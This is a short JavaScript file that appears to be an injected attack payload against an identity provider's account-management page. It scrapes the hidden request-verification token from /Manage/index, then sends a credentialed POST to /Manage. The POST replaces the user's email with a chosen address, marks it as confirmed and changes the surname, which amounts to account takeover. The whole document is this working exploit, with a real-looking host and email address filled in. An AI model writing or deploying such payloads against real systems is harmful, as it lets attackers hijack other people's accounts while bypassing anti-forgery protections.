var firstname = "Tara";
var lastname= "MyNewLastname";
var email= "True"
var emailaddress ="tara.owens@bridewell.com"
var host = "https://identity.cybiquity.io";
var manage = "/Manage";
var index = "/Manage/index";
var token2;
var create_params;

async function getToken() {
    try {
        const response = await fetch(host+index); // replace '/index' with your actual endpoint
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const html = await response.text(); // Get the HTML content
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');

        // Replace the selector with the actual selector for your token input
        const tokenInput = doc.querySelector('body > div.flex.flex-col.flex-auto.w-full.min-w-0 > div.flex.flex-col.flex-auto.relative > div > div > div > div.flex.flex-auto.overflow-hidden > div > form > input[type=hidden]:nth-child(6)');

        if (tokenInput) {
            const token = tokenInput.value;
            return token;
        } else {
            throw new Error('Token input not found in the HTML.');
        }
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}

// Example usage:
getToken().then(token => {
    if (token) {
    	token2=token;
        console.log('Token:', token);
        create_params = "isEmailConfirmed=" + email +"&Email="+ emailaddress+"&FirstName=" + firstname + "&LastName=" + lastname + "&__RequestVerificationToken=" + token2 ;
        send_modify();
        
        // Do something with the token
    } else {
        console.log('Failed to retrieve the token.');
    }
});


function send_modify() { 
  console.log("Modifying User..."); 
  fetch(host+manage, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response2) {
    isdone();
  }); 
}

function isdone() { 
  console.log("Done"); 
  
}

getToken();




